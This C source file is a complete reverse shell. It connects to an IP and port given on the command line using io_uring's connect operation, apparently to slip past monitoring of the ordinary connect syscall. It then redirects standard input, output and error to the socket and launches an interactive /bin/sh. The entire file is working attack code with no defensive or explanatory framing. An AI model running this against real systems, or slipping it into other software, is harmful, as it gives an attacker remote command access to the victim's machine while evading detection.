#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/io_uring.h>
#include "iouring_utils.h"

int main(int argc, char *argv[])
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s <ip> <port>\n", argv[0]);
        return 1;
    }

    const char *ip = argv[1];
    int port       = atoi(argv[2]);

    int sock = (int)syscall(__NR_socket, AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return 1; }

    struct uring u = {};
    if (uring_init(&u, 4) < 0) { perror("uring_init"); return 1; }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)port),
    };
    if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
        fprintf(stderr, "bad ip: %s\n", ip);
        return 1;
    }

    struct io_uring_sqe *sqe = uring_get_sqe(&u);
    sqe->opcode    = IORING_OP_CONNECT;
    sqe->fd        = sock;
    sqe->addr      = (uint64_t)(uintptr_t)&addr;
    sqe->off       = sizeof(addr);
    sqe->user_data = 1;

    uring_submit_wait(&u, 1);
    struct io_uring_cqe cqe;
    uring_peek_cqe(&u, &cqe);
    if ((int)cqe.res < 0) {
        fprintf(stderr, "connect %s:%d: %s\n", ip, port, strerror(-(int)cqe.res));
        return 1;
    }
    uring_free(&u);

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    close(sock);

    char *args[] = { "/bin/sh", "-i", NULL };
    execve("/bin/sh", args, NULL);
    perror("execve");
    return 1;
}
